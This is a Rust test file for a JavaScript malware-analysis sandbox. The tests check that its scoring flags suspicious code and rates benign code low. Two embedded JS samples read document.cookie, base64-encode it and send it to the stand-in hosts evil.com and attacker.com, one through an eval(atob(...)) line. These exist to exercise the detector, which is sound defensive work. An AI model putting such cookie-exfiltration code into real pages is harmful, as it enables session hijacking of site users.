use jsnabber_core::{ExecutionLimits, Sandbox};

#[test]
fn test_hybrid_analysis_complete() {
    // Malicious code with multiple suspicious patterns
    let code = r#"
        // Static patterns that will be detected
        function obfuscate(data) {
            return btoa(data);
        }
        
        function exfiltrate() {
            const cookie = document.cookie;
            fetch('https://evil.com/collect', {
                method: 'POST',
                body: obfuscate(cookie)
            });
        }
        
        // This function is never called by top-level code
        // But function discovery will find and execute it
    "#;

    let sandbox = Sandbox::new(ExecutionLimits::default()).expect("Sandbox creation failed");
    let result = sandbox.execute(code).expect("Execution failed");

    println!("\n=== Hybrid Analysis Results ===");
    println!("Execution Mode: {:?}", result.analysis.execution_mode);
    println!(
        "Functions Discovered: {}",
        result.analysis.functions_discovered
    );
    println!(
        "Unknown APIs Accessed: {}",
        result.analysis.accessed_unknown_apis
    );

    // Static Analysis
    println!("\n--- Static Analysis ---");
    println!(
        "Risk Score: {}/100",
        result.analysis.static_analysis.risk_score
    );
    println!(
        "Patterns Found: {}",
        result.analysis.static_analysis.patterns_found.len()
    );

    for pattern in &result.analysis.static_analysis.patterns_found {
        println!(
            "  - {} ({:?}) at lines {:?}",
            pattern.name, pattern.severity, pattern.line_numbers
        );
    }

    // Dynamic Analysis
    println!("\n--- Dynamic Analysis ---");
    println!("API Calls: {:?}", result.features.api_call_counts);

    // Assertions
    assert!(
        result.analysis.static_analysis.risk_score > 0,
        "Should have non-zero risk score"
    );

    // Should detect static patterns
    let pattern_names: Vec<_> = result
        .analysis
        .static_analysis
        .patterns_found
        .iter()
        .map(|p| p.name.as_str())
        .collect();

    assert!(
        pattern_names.contains(&"fetch request"),
        "Should detect fetch"
    );
    assert!(
        pattern_names.contains(&"cookie access"),
        "Should detect cookie access"
    );
    assert!(
        pattern_names.contains(&"base64 encode"),
        "Should detect btoa"
    );

    // Should have discovered and called functions
    assert!(
        result.analysis.functions_discovered > 0,
        "Should discover functions"
    );

    // Should have logged dynamic behavior
    assert!(
        result
            .features
            .api_call_counts
            .contains_key("function_discovery"),
        "Should have function discovery logs"
    );
}

#[test]
fn test_static_analysis_high_risk() {
    let code = r#"
        eval(atob("malicious_base64"));
        fetch("https://attacker.com");
        const data = document.cookie;
    "#;

    let sandbox = Sandbox::new(ExecutionLimits::default()).expect("Sandbox creation failed");
    let result = sandbox.execute(code).expect("Execution failed");

    println!("\n=== High Risk Code Analysis ===");
    println!("Risk Score: {}", result.analysis.static_analysis.risk_score);

    // High risk code should have high score
    assert!(
        result.analysis.static_analysis.risk_score >= 60,
        "High risk code should score >= 60, got {}",
        result.analysis.static_analysis.risk_score
    );

    // Should detect multiple high-severity patterns
    let high_severity_count = result
        .analysis
        .static_analysis
        .patterns_found
        .iter()
        .filter(|p| matches!(p.severity, jsnabber_core::static_analysis::Severity::High))
        .count();

    assert!(
        high_severity_count >= 2,
        "Should find at least 2 high-severity patterns"
    );
}

#[test]
fn test_static_analysis_benign() {
    let code = r#"
        function add(a, b) {
            return a + b;
        }
        
        const result = add(2, 3);
        console.log(result);
    "#;

    let sandbox = Sandbox::new(ExecutionLimits::default()).expect("Sandbox creation failed");
    let result = sandbox.execute(code).expect("Execution failed");

    println!("\n=== Benign Code Analysis ===");
    println!("Risk Score: {}", result.analysis.static_analysis.risk_score);
    println!(
        "Patterns: {:?}",
        result.analysis.static_analysis.patterns_found
    );

    // Benign code should have low/zero score
    assert!(
        result.analysis.static_analysis.risk_score < 20,
        "Benign code should score < 20, got {}",
        result.analysis.static_analysis.risk_score
    );
}
